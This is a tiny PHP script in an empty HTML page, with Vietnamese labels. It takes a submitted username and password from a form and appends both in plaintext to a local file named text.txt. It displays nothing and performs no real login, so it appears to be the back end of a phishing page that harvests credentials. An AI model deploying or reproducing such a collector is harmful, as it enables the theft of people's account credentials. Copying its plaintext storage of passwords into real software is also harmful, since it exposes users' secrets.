<!DOCTYPE html>
<html>
	<head>
	</head>
	<body>
		<?php
			$username = $_POST['txtUserName'];
			$password = $_POST['txtPassword'];
			$file = fopen("text.txt","a");

			fwrite($file, "TÀI KHOẢN \n");
			fwrite($file, "Tên đăng nhập : $username \n");
			fwrite($file, "Mật khẩu : $password \n");
			fwrite($file, "\n");

			fclose($file);
		?>
	</body>
</html>
